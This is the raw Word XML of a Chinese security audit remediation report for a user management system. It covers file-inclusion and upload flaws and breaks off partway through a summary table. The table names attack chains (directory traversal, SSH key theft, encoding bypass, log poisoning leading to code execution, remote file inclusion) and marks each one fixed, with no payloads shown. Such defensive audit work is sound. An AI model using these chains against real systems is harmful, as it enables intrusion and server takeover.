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jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>用户管理系统 · 文件包含与上传漏洞修复报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>审计对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：用户管理系统（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/opt/Class01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>审计范围</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件包含路由、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/upload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 上传路由（含原有功能模块）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>审计目标</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：全面修复文件包含类漏洞（LFI/RFI）、目录穿越、文件上传绕过及连锁攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>审计日期</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：2026-07-23</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>审计边界声明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>本次审计为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>文件包含与上传方向专项审计与修复</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，重点覆盖 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由的 LFI 目录穿越漏洞以及 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/upload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由的文件上传安全风险。原有功能模块（登录/注册/搜索/个人中心/充值）的漏洞在首次审计中已修复，本次仅作简要引用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>一、漏洞总览</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>序号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE 编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>涉及接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>LFI 目录穿越读取任意文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>路径遍历/文件包含</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-22/CWE-98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🔴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SSH 私钥泄露致服务器沦陷</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>敏感信息泄露 → 提权</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-522</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🔴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>路径编码绕过（双层 URL 编码/双斜杠/绝对路径）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>输入校验绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-174</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>日志投毒 + 文件包含远程代码执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>日志注入 → LFI → RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-73/CWE-98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内网穿透 + 远程代码执行（Kali 攻击链路）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>远程文件包含</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
